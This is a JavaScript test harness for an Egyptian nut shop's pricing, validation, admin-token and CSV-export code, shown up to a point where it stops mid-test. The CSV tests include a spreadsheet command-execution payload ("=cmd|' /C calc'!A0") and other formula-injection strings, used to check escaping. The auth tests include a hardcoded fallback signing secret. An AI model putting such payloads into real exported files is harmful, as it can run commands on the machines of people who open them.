/**
 * Tier 5 Adversarial White-Box Logic Stress Test Suite
 * 
 * Target: Core Domain Modules in src/lib/
 *  1. src/lib/pricing.ts (Custom Mix Box pricing & capacity invariants)
 *  2. src/lib/validation.ts (Egyptian phone numbers, Arabic digits, coupon calculations)
 *  3. src/lib/auth.ts & src/lib/csv.ts (HMAC-SHA256, timing attacks, CWE-1236, BOM, 17 Arabic headers)
 *  4. src/lib/slugs.ts (5-Tier slug resolution ladder, Arabic diacritics, 404 security)
 *  5. src/lib/reviews.ts & src/lib/nutrition.ts (Weighted average ratings, review validation, nutrition dictionary)
 * 
 * Execution:
 *   node scripts/tier5_logic_stress.mjs
 */

import fs from 'node:fs';
import path from 'node:path';
import crypto from 'node:crypto';
import assert from 'node:assert/strict';
import { fileURLToPath } from 'node:url';
import { createRequire } from 'node:module';
import ts from 'typescript';

const require = createRequire(import.meta.url);

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const ROOT_DIR = path.resolve(__dirname, '..');

// ANSI Terminal Colors
const colors = {
  reset: '\x1b[0m',
  bold: '\x1b[1m',
  green: '\x1b[32m',
  red: '\x1b[31m',
  yellow: '\x1b[33m',
  cyan: '\x1b[36m',
  magenta: '\x1b[35m',
  gray: '\x1b[90m',
};

// Test Runner State
let totalTests = 0;
let passedTests = 0;
let failedTests = 0;
const failures = [];

async function test(name, fn) {
  totalTests++;
  const start = performance.now();
  try {
    await fn();
    const duration = (performance.now() - start).toFixed(2);
    passedTests++;
    console.log(`  ${colors.green}✓ [PASS]${colors.reset} ${name} ${colors.gray}(${duration}ms)${colors.reset}`);
  } catch (err) {
    const duration = (performance.now() - start).toFixed(2);
    failedTests++;
    failures.push({ name, error: err });
    console.log(`  ${colors.red}✗ [FAIL]${colors.reset} ${name} ${colors.gray}(${duration}ms)${colors.reset}`);
    console.log(`    ${colors.red}Error: ${err.message}${colors.reset}`);
    if (err.stack) {
      const firstStack = err.stack.split('\n').slice(1, 3).join('\n');
      console.log(`    ${colors.gray}${firstStack}${colors.reset}`);
    }
  }
}

function suite(title) {
  console.log(`\n${colors.bold}${colors.cyan}══════════════════════════════════════════════════════════════════════════════${colors.reset}`);
  console.log(`${colors.bold}${colors.cyan}▶ ${title}${colors.reset}`);
  console.log(`${colors.bold}${colors.cyan}══════════════════════════════════════════════════════════════════════════════${colors.reset}`);
}

/**
 * Dynamic TypeScript Module Loader
 * Transpiles and loads src/lib/*.ts directly without pre-compilation,
 * ensuring white-box testing of the live source files.
 */
const moduleCache = {};

function loadLibModule(fileRel) {
  const fullPath = path.resolve(ROOT_DIR, fileRel);
  if (moduleCache[fullPath]) return moduleCache[fullPath];

  let code = fs.readFileSync(fullPath, 'utf8');
  // Rewrite @/lib/ import paths to relative paths
  code = code.replace(/@\/lib\//g, './');

  const res = ts.transpileModule(code, {
    compilerOptions: {
      module: ts.ModuleKind.CommonJS,
      target: ts.ScriptTarget.ES2022,
      esModuleInterop: true,
    },
  });

  const m = { exports: {} };
  moduleCache[fullPath] = m.exports;
  const dirname = path.dirname(fullPath);

  const customRequire = (req) => {
    if (req.startsWith('./')) {
      const target = path.join(dirname, req.endsWith('.ts') ? req : req + '.ts');
      if (fs.existsSync(target)) return loadLibModule(target);
    }
    return require(req);
  };

  const fn = new Function('require', 'module', 'exports', '__dirname', '__filename', res.outputText);
  fn(customRequire, m, m.exports, dirname, fullPath);
  moduleCache[fullPath] = m.exports;
  return m.exports;
}

// Load Live Modules Directly from src/lib/
const pricing = loadLibModule('src/lib/pricing.ts');
const validation = loadLibModule('src/lib/validation.ts');
const auth = loadLibModule('src/lib/auth.ts');
const csv = loadLibModule('src/lib/csv.ts');
const slugs = loadLibModule('src/lib/slugs.ts');
const reviews = loadLibModule('src/lib/reviews.ts');
const nutrition = loadLibModule('src/lib/nutrition.ts');
const dbModule = loadLibModule('src/lib/db.ts');

// Standard Fixture Products for Pricing & Slugs
const mockPistachio = {
  id: 'prod-pistachio-1',
  slug: 'jumbo-pistachio-usa',
  name: 'فستق أمريكي جامبو محمص',
  categoryId: 'cat-luxury-nuts',
  image: '/images/pistachio.jpg',
  rating: 4.9,
  reviewsCount: 38,
  featured: true,
  inStock: true,
  weights: [
    { id: 'w-250', weightGrams: 250, label: '250 جم', price: 215 },
    { id: 'w-500', weightGrams: 500, label: '500 جم', price: 420 },
    { id: 'w-1000', weightGrams: 1000, label: '1 كجم', price: 800 },
  ],
};

const mockCashew = {
  id: 'prod-cashew-1',
  slug: 'royal-cashew-jumbo',
  name: 'كاجو جامبو ملكي',
  categoryId: 'cat-luxury-nuts',
  image: '/images/cashew.jpg',
  rating: 4.8,
  reviewsCount: 29,
  featured: true,
  inStock: true,
  weights: [
    { id: 'w-250', weightGrams: 250, label: '250 جم', price: 195 },
    { id: 'w-500', weightGrams: 500, label: '500 جم', price: 380 },
    { id: 'w-1000', weightGrams: 1000, label: '1 كجم', price: 720 },
  ],
};

const mockHazelnut = {
  id: 'prod-hazelnut-1',
  slug: 'turkish-hazelnut-peeled',
  name: 'بندق تركي مقشر فاخر',
  categoryId: 'cat-luxury-nuts',
  image: '/images/hazelnut.jpg',
  rating: 4.7,
  reviewsCount: 22,
  featured: false,
  inStock: true,
  weights: [
    { id: 'w-250', weightGrams: 250, label: '250 جم', price: 205 },
    { id: 'w-500', weightGrams: 500, label: '500 جم', price: 400 },
    { id: 'w-1000', weightGrams: 1000, label: '1 كجم', price: 780 },
  ],
};

const mockWalnut = {
  id: 'prod-walnut-1',
  slug: 'chilean-walnut-halves',
  name: 'عين جمل تشيلي أنصاف',
  categoryId: 'cat-luxury-nuts',
  image: '/images/walnut.jpg',
  rating: 4.9,
  reviewsCount: 31,
  featured: false,
  inStock: true,
  weights: [
    { id: 'w-250', weightGrams: 250, label: '250 جم', price: 155 },
    { id: 'w-500', weightGrams: 500, label: '500 جم', price: 300 },
    { id: 'w-1000', weightGrams: 1000, label: '1 كجم', price: 580 },
  ],
};

async function runAllStressTests() {
  console.log(`\n${colors.bold}${colors.magenta}==============================================================================${colors.reset}`);
  console.log(`${colors.bold}${colors.magenta}  محمصة الواحة الذهبية — Tier 5 White-Box Logic Stress Test Harness${colors.reset}`);
  console.log(`${colors.bold}${colors.magenta}  Direct Source Invariant Verification (src/lib/)${colors.reset}`);
  console.log(`${colors.bold}${colors.magenta}==============================================================================${colors.reset}`);

  // ───────────────────────────────────────────────────────────────────────────
  // SUITE 1: PRICING ENGINE (src/lib/pricing.ts)
  // ───────────────────────────────────────────────────────────────────────────
  suite('1. Core Pricing Engine (src/lib/pricing.ts)');

  await test('T5_PRICING_01: getProductBasePriceForBox with explicit 500g variant', () => {
    const price = pricing.getProductBasePriceForBox(mockPistachio, 500);
    assert.equal(price, 420, '500g variant price should equal 420 EGP');
  });

  await test('T5_PRICING_02: getProductBasePriceForBox 500g fallback from 1000g variant', () => {
    const prodNo500 = {
      ...mockPistachio,
      weights: [{ id: 'w-1000', weightGrams: 1000, label: '1 كجم', price: 800 }],
    };
    const price = pricing.getProductBasePriceForBox(prodNo500, 500);
    assert.equal(price, 400, '500g fallback from 1000g should equal round(800 / 2) = 400');
  });

  await test('T5_PRICING_03: getProductBasePriceForBox 500g fallback from 250g variant', () => {
    const prodOnly250 = {
      ...mockPistachio,
      weights: [{ id: 'w-250', weightGrams: 250, label: '250 جم', price: 215 }],
    };
    const price = pricing.getProductBasePriceForBox(prodOnly250, 500);
    assert.equal(price, 430, '500g fallback from 250g should equal 215 * 2 = 430');
  });

  await test('T5_PRICING_04: getProductBasePriceForBox with 1000g lookup & 500g fallback', () => {
    const p1000 = pricing.getProductBasePriceForBox(mockPistachio, 1000);
    assert.equal(p1000, 800, '1000g lookup should return 800');

    const prodNo1000 = {
      ...mockPistachio,
      weights: [{ id: 'w-500', weightGrams: 500, label: '500 جم', price: 420 }],
    };
    const pFallback = pricing.getProductBasePriceForBox(prodNo1000, 1000);
    assert.equal(pFallback, 840, '1000g fallback from 500g should equal 420 * 2 = 840');
  });

  await test('T5_PRICING_05: getProductBasePriceForBox with 2000g (doubling 1000g base)', () => {
    const p2000 = pricing.getProductBasePriceForBox(mockPistachio, 2000);
    assert.equal(p2000, 1600, '2000g price should equal 2 * 1000g price = 1600 EGP');

    const prodWith2000 = {
      ...mockPistachio,
      weights: [
        ...mockPistachio.weights,
        { id: 'w-2000', weightGrams: 2000, label: '2 كجم', price: 1550 },
      ],
    };
    const pExplicit = pricing.getProductBasePriceForBox(prodWith2000, 2000);
    assert.equal(pExplicit, 1550, '2000g should prefer explicit w-2000 variant if present');
  });

  await test('T5_PRICING_06: getProductBasePriceForBox edge cases (empty weights, null product, invalid size)', () => {
    assert.equal(pricing.getProductBasePriceForBox(null, 500), 0);
    assert.equal(pricing.getProductBasePriceForBox({ weights: [] }, 500), 0);
    assert.equal(pricing.getProductBasePriceForBox(mockPistachio, 750), 0);
  });

  await test('T5_PRICING_07: calculateCustomBoxPrice 500g standard 50/50 mix', () => {
    const portions = [
      { product: mockPistachio, percentage: 50, roastOption: 'roasted_salted' },
      { product: mockCashew, percentage: 50, roastOption: 'roasted_light' },
    ];
    const res = pricing.calculateCustomBoxPrice(500, portions);
    assert.equal(res.isValid, true);
    assert.equal(res.totalPercentage, 100);
    // 50% of 420 = 210, 50% of 380 = 190. Total = 400.
    assert.equal(res.totalPrice, 400);
    assert.equal(res.breakdown.length, 2);
    assert.equal(res.breakdown[0].weightGrams, 250);
    assert.equal(res.breakdown[0].priceContribution, 210);
    assert.equal(res.breakdown[1].weightGrams, 250);
    assert.equal(res.breakdown[1].priceContribution, 190);
  });

  await test('T5_PRICING_08: calculateCustomBoxPrice 1000g standard 50/30/20 mix', () => {
    const portions = [
      { product: mockPistachio, percentage: 50, roastOption: 'roasted_salted' }, // 800 * 0.50 = 400
      { product: mockCashew, percentage: 30, roastOption: 'raw' },               // 720 * 0.30 = 216
      { product: mockHazelnut, percentage: 20, roastOption: 'roasted' },         // 780 * 0.20 = 156
    ];
    const res = pricing.calculateCustomBoxPrice(1000, portions);
    assert.equal(res.isValid, true);
    assert.equal(res.totalPrice, 772, '400 + 216 + 156 = 772 EGP');
    assert.equal(res.breakdown[0].weightGrams, 500);
    assert.equal(res.breakdown[1].weightGrams, 300);
    assert.equal(res.breakdown[2].weightGrams, 200);
  });

  await test('T5_PRICING_09: calculateCustomBoxPrice 2000g 4-nut equal 25% allocation', () => {
    const portions = [
      { product: mockPistachio, percentage: 25, roastOption: 'roasted_salted' }, // 1600 * 0.25 = 400
      { product: mockHazelnut, percentage: 25, roastOption: 'roasted' },         // 1560 * 0.25 = 390
      { product: mockCashew, percentage: 25, roastOption: 'raw' },               // 1440 * 0.25 = 360
      { product: mockWalnut, percentage: 25, roastOption: 'raw' },               // 1160 * 0.25 = 290
    ];
    const res = pricing.calculateCustomBoxPrice(2000, portions);
    assert.equal(res.isValid, true);
    assert.equal(res.totalPrice, 1440, '400 + 390 + 360 + 290 = 1440 EGP');
    assert.equal(res.breakdown.every(b => b.weightGrams === 500), true);
  });

  await test('T5_PRICING_10: calculateCustomBoxPrice rejection of empty portions array', () => {
    const res = pricing.calculateCustomBoxPrice(1000, []);
    assert.equal(res.isValid, false);
    assert.equal(res.totalPrice, 0);
    assert.match(res.error, /لم يتم اختيار أي أصناف/);
  });

  await test('T5_PRICING_11: calculateCustomBoxPrice rejection of negative percentage portion', () => {
    const portions = [
      { product: mockPistachio, percentage: 110, roastOption: 'raw' },
      { product: mockCashew, percentage: -10, roastOption: 'raw' },
    ];
    const res = pricing.calculateCustomBoxPrice(1000, portions);
    assert.equal(res.isValid, false);
    assert.match(res.error, /نسبة الصنف يجب أن تكون أكبر من صفر/);
  });

  await test('T5_PRICING_12: calculateCustomBoxPrice rejection of zero percentage portion', () => {
    const portions = [
      { product: mockPistachio, percentage: 100, roastOption: 'raw' },
      { product: mockCashew, percentage: 0, roastOption: 'raw' },
    ];
    const res = pricing.calculateCustomBoxPrice(1000, portions);
    assert.equal(res.isValid, false);
    assert.match(res.error, /نسبة الصنف يجب أن تكون أكبر من صفر/);
  });

  await test('T5_PRICING_13: calculateCustomBoxPrice rejection of NaN percentage portion', () => {
    const portions = [
      { product: mockPistachio, percentage: NaN, roastOption: 'raw' },
      { product: mockCashew, percentage: 100, roastOption: 'raw' },
    ];
    const res = pricing.calculateCustomBoxPrice(1000, portions);
    assert.equal(res.isValid, false);
    assert.match(res.error, /نسبة الصنف يجب أن تكون أكبر من صفر/);
  });

  await test('T5_PRICING_14: calculateCustomBoxPrice capacity underflow (<100%, e.g. 85%)', () => {
    const portions = [
      { product: mockPistachio, percentage: 50, roastOption: 'raw' },
      { product: mockCashew, percentage: 35, roastOption: 'raw' },
    ];
    const res = pricing.calculateCustomBoxPrice(1000, portions);
    assert.equal(res.isValid, false);
    assert.equal(res.totalPercentage, 85);
    assert.match(res.error, /سعة العلبة غير مكتملة/);
    assert.match(res.error, /المتبقي: 15%/);
  });

  await test('T5_PRICING_15: calculateCustomBoxPrice capacity overflow (>100%, e.g. 115%)', () => {
    const portions = [
      { product: mockPistachio, percentage: 65, roastOption: 'raw' },
      { product: mockCashew, percentage: 50, roastOption: 'raw' },
    ];
    const res = pricing.calculateCustomBoxPrice(1000, portions);
    assert.equal(res.isValid, false);
    assert.equal(res.totalPercentage, 115);
    assert.match(res.error, /لقد تجاوزت السعة الإجمالية 100%/);
    assert.match(res.error, /بمقدار 15%/);
  });

  await test('T5_PRICING_16: calculateCustomBoxPrice decimal precision (33.34% + 33.33% + 33.33% = 100%)', () => {
    const portions = [
      { product: mockPistachio, percentage: 33.34, roastOption: 'raw' }, // 800 * 0.3334 = 266.72 -> 267
      { product: mockCashew, percentage: 33.33, roastOption: 'raw' },    // 720 * 0.3333 = 239.976 -> 240
      { product: mockHazelnut, percentage: 33.33, roastOption: 'raw' },  // 780 * 0.3333 = 259.974 -> 260
    ];
    const res = pricing.calculateCustomBoxPrice(1000, portions);
    assert.equal(res.isValid, true);
    assert.equal(res.totalPercentage, 100);
    assert.equal(res.totalPrice, 267 + 240 + 260); // 767 EGP
  });

  await test('T5_PRICING_17: calculateCustomBoxPrice rejection of unsupported box capacities', () => {
    const portions = [{ product: mockPistachio, percentage: 100, roastOption: 'raw' }];
    assert.equal(pricing.calculateCustomBoxPrice(250, portions).isValid, false);
    assert.equal(pricing.calculateCustomBoxPrice(750, portions).isValid, false);
    assert.equal(pricing.calculateCustomBoxPrice(1500, portions).isValid, false);
    assert.equal(pricing.calculateCustomBoxPrice(3000, portions).isValid, false);
  });

  await test('T5_PRICING_18: calculateCustomBoxPrice breakdown weightGrams & priceContribution sum', () => {
    const portions = [
      { product: mockPistachio, percentage: 40, roastOption: 'raw' },  // 800 * 0.40 = 320
      { product: mockHazelnut, percentage: 35, roastOption: 'raw' },   // 780 * 0.35 = 273
      { product: mockCashew, percentage: 25, roastOption: 'raw' },     // 720 * 0.25 = 180
    ];
    const res = pricing.calculateCustomBoxPrice(1000, portions);
    assert.equal(res.isValid, true);
    assert.equal(res.totalPrice, 320 + 273 + 180); // 758 EGP
    const sumWeights = res.breakdown.reduce((sum, b) => sum + b.weightGrams, 0);
    assert.equal(sumWeights, 1000, 'Sum of weights must equal box capacity 1000g');
    const sumPrices = res.breakdown.reduce((sum, b) => sum + b.priceContribution, 0);
    assert.equal(sumPrices, res.totalPrice, 'Sum of contributions must equal totalPrice');
  });

  // ───────────────────────────────────────────────────────────────────────────
  // SUITE 2: VALIDATION & NORMALIZATION (src/lib/validation.ts)
  // ───────────────────────────────────────────────────────────────────────────
  suite('2. Validation & Normalization Engine (src/lib/validation.ts)');

  await test('T5_VAL_01: normalizeArabicDigits converts Eastern Arabic numerals (٠-٩)', () => {
    const input = '٠١٢٣٤٥٦٧٨٩';
    const output = validation.normalizeArabicDigits(input);
    assert.equal(output, '0123456789');
  });

  await test('T5_VAL_02: normalizeArabicDigits converts Persian numerals (۰-۹)', () => {
    const input = '۰۱۲۳۴۵۶۷۸۹';
    const output = validation.normalizeArabicDigits(input);
    assert.equal(output, '0123456789');
  });

  await test('T5_VAL_03: validateEgyptianPhone across all 4 Egyptian carriers (010, 011, 012, 015)', () => {
    const vodafone = validation.validateEgyptianPhone('01012345678');
    assert.equal(vodafone.isValid, true);
    assert.equal(vodafone.normalized, '01012345678');

    const etisalat = validation.validateEgyptianPhone('01198765432');
    assert.equal(etisalat.isValid, true);
    assert.equal(etisalat.normalized, '01198765432');

    const orange = validation.validateEgyptianPhone('01234567890');
    assert.equal(orange.isValid, true);
    assert.equal(orange.normalized, '01234567890');

    const we = validation.validateEgyptianPhone('01555555555');
    assert.equal(we.isValid, true);
    assert.equal(we.normalized, '01555555555');
  });

  await test('T5_VAL_04: validateEgyptianPhone international prefix variations (+20, 0020, 20)', () => {
    const withPlus20 = validation.validateEgyptianPhone('+201012345678');
    assert.equal(withPlus20.isValid, true);
    assert.equal(withPlus20.normalized, '01012345678');

    const withDoubleZero = validation.validateEgyptianPhone('00201112345678');
    assert.equal(withDoubleZero.isValid, true);
    assert.equal(withDoubleZero.normalized, '01112345678');

    const with20 = validation.validateEgyptianPhone('201212345678');
    assert.equal(with20.isValid, true);
    assert.equal(with20.normalized, '01212345678');

    // Omitted leading 0 with international code (+20 10... -> 010...)
    const omittedZero = validation.validateEgyptianPhone('+201512345678');
    assert.equal(omittedZero.isValid, true);
    assert.equal(omittedZero.normalized, '01512345678');
  });

  await test('T5_VAL_05: validateEgyptianPhone international prefix with Eastern Arabic numerals', () => {
    const res = validation.validateEgyptianPhone('+٢٠١٠١٢٣٤٥٦٧٨');
    assert.equal(res.isValid, true);
    assert.equal(res.normalized, '01012345678');
  });

  await test('T5_VAL_06: validateEgyptianPhone formatting cleanup (spaces, dashes, parens, dots, underscores)', () => {
    const complex = validation.validateEgyptianPhone('+20 (010) 1234-5678');
    assert.equal(complex.isValid, true);
    assert.equal(complex.normalized, '01012345678');

    const withDotsUnderscores = validation.validateEgyptianPhone('011.2345_6789');
    assert.equal(withDotsUnderscores.isValid, true);
    assert.equal(withDotsUnderscores.normalized, '01123456789');
  });

  await test('T5_VAL_07: validateEgyptianPhone rejection of non-Egyptian prefixes (013, 014, 016, 017, 018, 019)', () => {
    const invalidPrefixes = ['01312345678', '01412345678', '01612345678', '01712345678', '01812345678', '01912345678'];
    for (const num of invalidPrefixes) {
      const res = validation.validateEgyptianPhone(num);
      assert.equal(res.isValid, false, `Prefix ${num.slice(0, 3)} should be rejected`);
      assert.match(res.error, /يبدأ بـ/);
    }
  });

  await test('T5_VAL_08: validateEgyptianPhone length boundary rejection (10 digits & 12 digits)', () => {
    const shortNum = validation.validateEgyptianPhone('0101234567'); // 10 digits
    assert.equal(shortNum.isValid, false);

    const longNum = validation.validateEgyptianPhone('010123456789'); // 12 digits
    assert.equal(longNum.isValid, false);
  });

  await test('T5_VAL_09: validateEgyptianPhone malformed string rejection (empty, letters, symbols, null)', () => {
    assert.equal(validation.validateEgyptianPhone('').isValid, false);
    assert.equal(validation.validateEgyptianPhone('   ').isValid, false);
    assert.equal(validation.validateEgyptianPhone(null).isValid, false);
    assert.equal(validation.validateEgyptianPhone('0101234567a').isValid, false);
    assert.equal(validation.validateEgyptianPhone('0101234567#').isValid, false);
  });

  await test('T5_VAL_10: validateCoupon percentage discount (NUTS10) on eligible subtotal', () => {
    const coupon = { id: 'c1', code: 'NUTS10', discountType: 'percentage', value: 10, minOrderAmount: 300, active: true };
    const res = validation.validateCoupon(coupon, 1000);
    assert.equal(res.isValid, true);
    assert.equal(res.discountAmount, 100, '10% of 1000 should equal 100 EGP');
  });

  await test('T5_VAL_11: validateCoupon fixed discount (WELCOME50) on eligible subtotal', () => {
    const coupon = { id: 'c2', code: 'WELCOME50', discountType: 'fixed', value: 50, minOrderAmount: 500, active: true };
    const res = validation.validateCoupon(coupon, 800);
    assert.equal(res.isValid, true);
    assert.equal(res.discountAmount, 50, 'Fixed discount should equal 50 EGP');
  });

  await test('T5_VAL_12: validateCoupon minOrderAmount boundary (exact threshold vs 1 EGP below)', () => {
    const coupon = { id: 'c3', code: 'VIP100', discountType: 'fixed', value: 100, minOrderAmount: 600, active: true };
    
    // Exactly at threshold: valid
    const exact = validation.validateCoupon(coupon, 600);
    assert.equal(exact.isValid, true);
    assert.equal(exact.discountAmount, 100);

    // 1 EGP below threshold: invalid
    const below = validation.validateCoupon(coupon, 599);
    assert.equal(below.isValid, false);
    assert.equal(below.discountAmount, 0);
    assert.match(below.error, /الحد الأدنى لاستخدام هذا الكود هو 600/);
  });

  await test('T5_VAL_13: validateCoupon inactive coupon rejection (active: false)', () => {
    const coupon = { id: 'c4', code: 'EXPIRED', discountType: 'percentage', value: 20, minOrderAmount: 100, active: false };
    const res = validation.validateCoupon(coupon, 1000);
    assert.equal(res.isValid, false);
    assert.equal(res.discountAmount, 0);
    assert.match(res.error, /غير مفعّل أو منتهي الصلاحية/);
  });

  await test('T5_VAL_14: validateCoupon fixed discount capping (never exceeds subtotal)', () => {
    // Coupon value 200 with minOrderAmount 100, subtotal 150
    const coupon = { id: 'c5', code: 'BIGDISCOUNT', discountType: 'fixed', value: 200, minOrderAmount: 100, active: true };
    const res = validation.validateCoupon(coupon, 150);
    assert.equal(res.isValid, true);
    assert.equal(res.discountAmount, 150, 'Discount must be capped at subtotal (150) so total is not negative');
  });

  await test('T5_VAL_15: validateCoupon zero, negative, or invalid subtotal handling', () => {
    const coupon = { id: 'c6', code: 'TEST', discountType: 'percentage', value: 10, minOrderAmount: 50, active: true };
    assert.equal(validation.validateCoupon(coupon, 0).isValid, false);
    assert.equal(validation.validateCoupon(coupon, -100).isValid, false);
    assert.equal(validation.validateCoupon(null, 500).isValid, false);
  });

  // ───────────────────────────────────────────────────────────────────────────
  // SUITE 3: AUTHENTICATION & CSV EXPORT (src/lib/auth.ts & src/lib/csv.ts)
  // ───────────────────────────────────────────────────────────────────────────
  suite('3. Admin Authentication & CSV Export Engine (src/lib/auth.ts & src/lib/csv.ts)');

  await test('T5_AUTH_01: generateAdminToken creates base64url token with 24h expiration', () => {
    const before = Date.now();
    const { token, expiresAt } = auth.generateAdminToken('admin');
    const after = Date.now();

    assert.ok(typeof token === 'string' && token.length > 20);
    assert.ok(expiresAt >= before + 24 * 60 * 60 * 1000 - 1000);
    assert.ok(expiresAt <= after + 24 * 60 * 60 * 1000 + 1000);

    // Verify token can be parsed from base64url JSON
    const decoded = JSON.parse(Buffer.from(token, 'base64url').toString('utf8'));
    assert.equal(decoded.expiresAt, expiresAt);
    assert.ok(typeof decoded.sig === 'string' && decoded.sig.length === 64);
  });

  await test('T5_AUTH_02: verifyAdminToken accepts valid token with store admin password', () => {
    const { token } = auth.generateAdminToken('admin');
    const isValid = auth.verifyAdminToken(token, 'admin');
    assert.equal(isValid, true, 'Valid token must be verified successfully');
  });

  await test('T5_AUTH_03: verifyAdminToken rejects token when verified against wrong password', () => {
    const { token } = auth.generateAdminToken('correct-pass');
    const isValid = auth.verifyAdminToken(token, 'wrong-pass');
    assert.equal(isValid, false, 'Token with wrong password signature must be rejected');
  });

  await test('T5_AUTH_04: verifyAdminToken rejects tampered signature (single byte modification)', () => {
    const { token } = auth.generateAdminToken('admin');
    const decoded = JSON.parse(Buffer.from(token, 'base64url').toString('utf8'));
    
    // Flip first character of the hex signature
    const tamperedChar = decoded.sig[0] === 'a' ? 'b' : 'a';
    decoded.sig = tamperedChar + decoded.sig.slice(1);

    const tamperedToken = Buffer.from(JSON.stringify(decoded)).toString('base64url');
    const isValid = auth.verifyAdminToken(tamperedToken, 'admin');
    assert.equal(isValid, false, 'Tampered token signature must be rejected');
  });

  await test('T5_AUTH_05: verifyAdminToken rejects expired token timestamp', () => {
    const expiredTimestamp = Date.now() - 5000; // 5 seconds ago
    const SECRET_SALT = process.env.ADMIN_JWT_SECRET || 'golden-oasis-admin-secret-salt-v1';
    const payload = `${expiredTimestamp}:admin:${SECRET_SALT}`;
    const sig = crypto.createHmac('sha256', SECRET_SALT).update(payload).digest('hex');
    const expiredToken = Buffer.from(JSON.stringify({ expiresAt: expiredTimestamp, sig })).toString('base64url');

    const isValid = auth.verifyAdminToken(expiredToken, 'admin');
    assert.equal(isValid, false, 'Expired token must be rejected');
  });

  await test('T5_AUTH_06: verifyAdminToken rejects malformed, empty, or non-base64 token strings', () => {
    assert.equal(auth.verifyAdminToken(''), false);
    assert.equal(auth.verifyAdminToken('   '), false);
    assert.equal(auth.verifyAdminToken(null), false);
    assert.equal(auth.verifyAdminToken('not-a-token'), false);
    assert.equal(auth.verifyAdminToken(Buffer.from('{}').toString('base64url')), false);
    assert.equal(auth.verifyAdminToken(Buffer.from(JSON.stringify({ foo: 'bar' })).toString('base64url')), false);
  });

  await test('T5_AUTH_07: extractAdminToken from Authorization Bearer, raw header, x-admin-token, and cookie', () => {
    // 1. Authorization: Bearer <token>
    const req1 = new Request('http://localhost/api/store', {
      headers: { Authorization: 'Bearer my-token-123' },
    });
    assert.equal(auth.extractAdminToken(req1), 'my-token-123');

    // 2. Authorization: <raw-token>
    const req2 = new Request('http://localhost/api/store', {
      headers: { Authorization: 'my-raw-token' },
    });
    assert.equal(auth.extractAdminToken(req2), 'my-raw-token');

    // 3. x-admin-token header
    const req3 = new Request('http://localhost/api/store', {
      headers: { 'x-admin-token': 'header-token-456' },
    });
    assert.equal(auth.extractAdminToken(req3), 'header-token-456');

    // 4. Cookie: admin_session=<token>
    const req4 = new Request('http://localhost/api/store', {
      headers: { Cookie: 'admin_session=cookie-token-789; other=1' },
    });
    assert.equal(auth.extractAdminToken(req4), 'cookie-token-789');
  });

  await test('T5_AUTH_08: sanitizePublicStoreData strips adminPassword and purges customer orders', () => {
    const rawDb = {
      settings: { storeName: 'محمصة الواحة الذهبية', adminPassword: 'secret-pass-123' },
      products: [mockPistachio],
      orders: [{ id: 'order-1', customerName: 'أحمد' }],
      categories: [],
      shippingRates: [],
      coupons: [],
    };

    const sanitized = auth.sanitizePublicStoreData(rawDb);
    assert.equal(sanitized.settings.storeName, 'محمصة الواحة الذهبية');
    assert.equal(sanitized.settings.adminPassword, undefined, 'adminPassword must be deleted');
    assert.deepEqual(sanitized.orders, [], 'orders array must be sanitized to empty array');
  });

  await test('T5_CSV_01: CSV_ORDER_HEADERS contains exactly 17 Arabic column headers in required order', () => {
    assert.equal(csv.CSV_ORDER_HEADERS.length, 17, 'Must have exactly 17 headers');
    const expected = [
      'رقم الطلب', 'تاريخ الطلب', 'اسم العميل', 'رقم الهاتف', 'هاتف بديل',
      'المحافظة', 'العنوان', 'الأصناف المطلوبة', 'المجموع الفرعي', 'تكلفة الشحن',
      'قيمة الخصم', 'كود الخصم', 'الإجمالي النهائي', 'طريقة الدفع', 'المرجع للدفع',
      'حالة الطلب', 'ملاحظات'
    ];
    assert.deepEqual([...csv.CSV_ORDER_HEADERS], expected);
  });

  await test('T5_CSV_02: generateOrdersCsv output contains UTF-8 BOM (\\uFEFF) at index 0', () => {
    const csvContent = csv.generateOrdersCsv([]);
    assert.equal(csvContent.charCodeAt(0), 0xFEFF, 'First character must be UTF-8 BOM (\\uFEFF)');
    assert.equal(csvContent.startsWith('\uFEFF'), true);
  });

  await test('T5_CSV_03: escapeCsvField neutralizes formula injection triggers (=, +, -, @, \\t, \\r)', () => {
    assert.equal(csv.escapeCsvField("=cmd|' /C calc'!A0"), `"'=cmd|' /C calc'!A0"`);
    assert.equal(csv.escapeCsvField('+1+2'), `\"'+1+2\"`);
    assert.equal(csv.escapeCsvField('-1+2'), `\"'-1+2\"`);
    assert.equal(csv.escapeCsvField('@SUM(A1:A10)'), `\"'@SUM(A1:A10)\"`);
    assert.equal(csv.escapeCsvField('\t=1+1'), `\"'\t=1+1\"`);
    assert.equal(csv.escapeCsvField('\r=cmd'), `\"'\r=cmd\"`);
  });

  await test('T5_CSV_04: escapeCsvField neutralizes formula injection with leading whitespace', () => {
    assert.equal(csv.escapeCsvField('   =1+1'), `\"'   =1+1\"`);
    assert.equal(csv.escapeCsvField('   +test'), `\"'   +test\"`);
    assert.equal(csv.escapeCsvField('   @evil'), `\"'   @evil\"`);
  });

  await test('T5_CSV_05: escapeCsvField preserves primitive numbers without formula prefixing', () => {
    assert.equal(csv.escapeCsvField(42), '"42"', 'Numeric 42 must NOT have leading single quote');
    assert.equal(csv.escapeCsvField(0), '"0"');
    assert.equal(csv.escapeCsvField(772.5), '"772.5"');
  });

  await test('T5_CSV_06: escapeCsvField RFC 4180 double-quote escaping and newline flattening', () => {
    assert.equal(csv.escapeCsvField('شارع "النصر"'), '"شارع ""النصر"""');
    assert.equal(csv.escapeCsvField("سطر أول\nسطر ثان"), '"سطر أول سطر ثان"');
    assert.equal(csv.escapeCsvField(null), '""');
    assert.equal(csv.escapeCsvField(undefined), '""');
  });

  await test('T5_CSV_07: generateOrdersCsv formats Custom Mix box with complete recipe breakdown', () => {
    const orderWithCustom = {
      orderNumber: 'ORD-TEST-1',
      createdAt: '2026-10-14T10:00:00Z',
      customerName: 'طارق علي',
      customerPhone: '01012345678',
      governorate: 'القاهرة',
      address: 'المعادي',
      subtotal: 772,
      shippingCost: 50,
      discountAmount: 0,
      total: 822,
      paymentMethod: 'cod',
      status: 'pending',
      items: [
        {
          productId: 'custom-box',
          productName: 'علبة مشكلة مخصصة',
          quantity: 1,
          isCustomMix: true,
          boxCapacityGrams: 1000,
          customBreakdown: [
            { productName: 'فستق أمريكي', roastOption: 'محمص مملح', percentage: 50 },
            { productName: 'كاجو جامبو', roastOption: 'نيء', percentage: 50 },
          ],
        },
      ],
    };

    const csvOutput = csv.generateOrdersCsv([orderWithCustom]);
